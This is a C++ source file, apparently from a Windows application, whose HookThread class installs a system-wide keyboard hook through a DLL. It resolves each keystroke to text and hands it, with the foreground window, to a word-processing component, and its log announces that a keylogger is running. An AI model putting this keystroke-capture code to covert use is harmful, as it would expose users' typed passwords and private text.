#include "HookThread.h"


using namespace std;

HookThread::HookThread(IKeyResover* resolver, IWordProcessor* processor) {
    logger = AppContainer::instance().appLogger();
    keyResolver = resolver;
    wordProcessor = processor;
    pBuf = NULL;
    hHook = NULL;
}

LRESULT CALLBACK HookThread::HookProc(int nCode, WPARAM wParam, LPARAM lParam) {

    KBDLLHOOKSTRUCT* pKeyboardData = (KBDLLHOOKSTRUCT*)lParam;
    //Получим результат нажатой клавиши в символьном ввиде
    std::wstring result = keyResolver->resolve(nCode, wParam, lParam);

    if (wordProcessor == NULL) throw std::runtime_error("WordProcessor is NULL");

    HWND window = GetForegroundWindow();

    wordProcessor->process(window, result);

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void HookThread::stop() {
    if(hHook != NULL)
        UnhookWindowsHookEx(hHook);
    PostQuitMessage(0);
}

void HookThread::run()
{
    HMODULE hLib = LoadLibrary(TEXT("HookDll"));

    AdapterWorker<HookThread> KeyHookProcAdapter(this, &HookThread::HookProc);
    hHook = SetWindowsHookEx(WH_KEYBOARD, AdapterWorker<HookThread>::HookProc, hLib, 0);
    //AdapterWorker<HookThread, LRESULT CALLBACK, int, WPARAM, LPARAM> KeyHookProcAdapter(this, &HookThread::HookProc);
    //hHook = SetWindowsHookExW(WH_KEYBOARD_LL, AdapterWorker<HookThread, LRESULT CALLBACK, int, WPARAM, LPARAM>::Function, NULL, 0);

    if (hHook == NULL) {
        char buffer[40];
        _itoa_s(GetLastError(), buffer, 10);
        std::string str(buffer);
        logger->error(std::string("WorkerThread::HookJob() : ") + std::string("Cannot install the hook procedure. Last error: ") + str);
    }
    else {
        logger->information(std::string("WorkerThread::HookJob() : ") + "Hook procedure has been installed successfully");
        logger->information(std::string("WorkerThread::HookJob() : ") + "Keylogger is up and running...");

       /* std::string pipePath = AppContainer::instance().config()->getString("application.pipe.path");
        std::wstring _pipePath = std::wstring(pipePath.begin(), pipePath.end());
        CommandProcessor cp(_pipePath, logger, [&]() {
            stop();
        });*/

        MSG msg = { };
        while (GetMessage(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}

    


